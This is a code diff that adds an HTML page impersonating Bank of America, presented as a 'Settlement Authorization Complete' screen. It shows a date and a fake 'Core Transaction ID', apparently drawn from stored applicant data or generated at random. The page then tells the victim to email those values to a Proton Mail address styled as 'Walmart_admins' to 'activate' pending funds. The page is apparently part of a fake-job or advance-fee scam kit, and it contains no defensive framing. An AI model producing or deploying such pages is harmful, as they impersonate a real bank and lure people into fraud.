@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America - Settlement Authorization Complete</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; color: #333333; margin: 0; padding: 16px; line-height: 1.5; }
+        .bofa-portal-card { max-width: 540px; margin: 25px auto; background: #ffffff; border-radius: 6px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08); overflow: hidden; border: 1px solid #d1d5db; }
+        .bofa-brand-header { background: #0A256C; color: #ffffff; padding: 20px 24px; position: relative; border-bottom: 3px solid #E21C39; }
+        .bofa-logo-text { font-size: 18px; font-weight: 700; letter-spacing: -0.2px; margin: 0; text-transform: none; }
+        .bofa-logo-text span { color: #ffffff; font-weight: 300; }
+        .bofa-card-content { padding: 24px; text-align: center; }
+        
+        .success-checkmark-circle { width: 64px; height: 64px; border-radius: 50%; background: #f0fdf4; border: 2px solid #22c55e; color: #16a34a; font-size: 32px; font-weight: 700; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px auto; }
+        .success-hero-headline { font-size: 22px; font-weight: 700; color: #0A256C; margin: 0 0 8px 0; text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        .bofa-section-heading { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: #4b5563; margin: 24px 0 10px 0; padding-bottom: 4px; border-bottom: 1px solid #e5e7eb; text-align: left; }
+        .bofa-details-matrix { display: grid; grid-template-columns: 1fr; gap: 12px; text-align: left; }
+        @media (min-width: 450px) { .bofa-details-matrix { grid-template-columns: 1fr 1fr; } }
+        
+        /* Grid Data & Interactive Button Design Classes */
+        .bofa-matrix-item { background: #fafafa; border: 1px solid #e5e7eb; padding: 12px; border-radius: 4px; position: relative; display: flex; flex-direction: column; justify-content: space-between; }
+        .bofa-matrix-label { font-size: 10px; font-weight: 600; text-transform: uppercase; color: #9ca3af; letter-spacing: 0.3px; margin-bottom: 4px; }
+        .bofa-matrix-value { font-size: 14px; font-weight: 600; color: #1f2937; word-break: break-all; padding-right: 45px; }
+        
+        .copy-btn-inline { position: absolute; right: 8px; bottom: 8px; background-color: #0A256C; color: #ffffff; border: none; font-size: 10px; font-weight: 700; text-transform: uppercase; padding: 4px 8px; border-radius: 3px; cursor: pointer; transition: background-color 0.2s ease; }
+        .copy-btn-inline:hover { background-color: #113694; }
+    </style>
+</head>
+<body>
+    <div class="bofa-portal-card">
+        <div class="bofa-brand-header">
+            <h1 class="bofa-logo-text">Bank of America <span>| Processing Verification</span></h1>
+        </div>
+        
+        <div class="bofa-card-content">
+            <div class="success-checkmark-circle">✓</div>
+            <h2 class="success-hero-headline">Sync Request Received</h2>
+
+            <div class="bofa-section-heading">Your Generated Tracking References</div>
+            <div class="bofa-details-matrix">
+                <div class="bofa-matrix-item">
+                    <div>
+                        <div class="bofa-matrix-label">DATE</div>
+                        <div id="successTimestamp" class="bofa-matrix-value">--------</div>
+                    </div>
+                    <button type="button" class="copy-btn-inline" onclick="copyReferenceText('successTimestamp', this)">Copy</button>
+                </div>
+                <div class="bofa-matrix-item">
+                    <div>
+                        <div class="bofa-matrix-label">Core Transaction ID (CTI)</div>
+                        <div id="successVerifyCode" class="bofa-matrix-value" style="font-family: monospace;">--------</div>
+                    </div>
+                    <button type="button" class="copy-btn-inline" onclick="copyReferenceText('successVerifyCode', this)">Copy</button>
+                </div>
+            </div>
+            <!-- Interactive Custom Verification Text Block -->
+            <div style="margin-top: 24px; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-left: 5px solid #16a34a; border-radius: 4px; padding: 16px; font-size: 13px; color: #1e293b; text-align: left; line-height: 1.6;">
+                <p style="margin: 0 0 8px 0; font-weight: 700; color: #0A256C; text-transform: uppercase; letter-spacing: 0.5px; font-size: 11px;">Account Funding Activation:</p>
+                To complete the release funds tracking loop and activate your account onboarding funds safely, please contact admin via email with your DATE and Core Transaction ID(CTI)<br>
+                <strong>EMAIL: <a href="mailto: Walmart_admins@protonmail.com" style="color: #0A256C; text-decoration: underline;">Walmart_admins@protonmail.com</a></strong>.
+            </div>
+
+            <!-- Custom Notice Terms Area Layout Component -->
+            <div style="margin-top: 16px; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 4px; padding: 14px; font-size: 12px; color: #475569; text-align: left; line-height: 1.5;">
+                <strong>Notice:</strong> Accounts are set to transition into operational active states within 24 hours. Pending credits automatically activate clear cash immediately following background confirmation routines. accordance with institutional verification checks. Clearing steps activate automatically.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        try {
+            // 1. Generate live dynamic system date format matching your guidelines
+            const currentTimestamp = new Date();
+            const dateOptions = { day: 'numeric', month: 'long', year: 'numeric' };
+            document.getElementById('successTimestamp').textContent = currentTimestamp.toLocaleDateString('en-US', dateOptions);
+
+            // 2. Extract state arrays or generate placeholder fallback sequences safely
+            const dataPackage = localStorage.getItem('applicantCVData');
+            let generatedCti = "CTI-" + Math.floor(10000000 + Math.random() * 90000000);
+            
+            if (dataPackage) {
+                const sessionRegistry = JSON.parse(dataPackage);
+                if (sessionRegistry.systemVerificationCode) {
+                    generatedCti = sessionRegistry.systemVerificationCode;
+                }
+            }
+            document.getElementById('successVerifyCode').textContent = generatedCti;
+            
+        } catch (syncFault) {
+            console.error("Layout context generation loop faulted:", syncFault);
+        }
+
+        // 3. Global Clipboard Copy Core Function
+        function copyReferenceText(elementId, buttonEl) {
+            const targetElement = document.getElementById(elementId);
+            if (!targetElement) return;
+
+            const textToCopy = targetElement.textContent.trim();
+            
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const originalText = buttonEl.textContent;
+                buttonEl.textContent = "Copied";
+                buttonEl.style.backgroundColor = "#16a34a";
+                
+                setTimeout(() => {
+                    buttonEl.textContent = originalText;
+                    buttonEl.style.backgroundColor = "#0A256C";
+                }, 2000);
+            }).catch(err => {
+                console.error("Clipboard copy failed:", err);
+            });
+        }
+    </script>
+</body>
+</html>
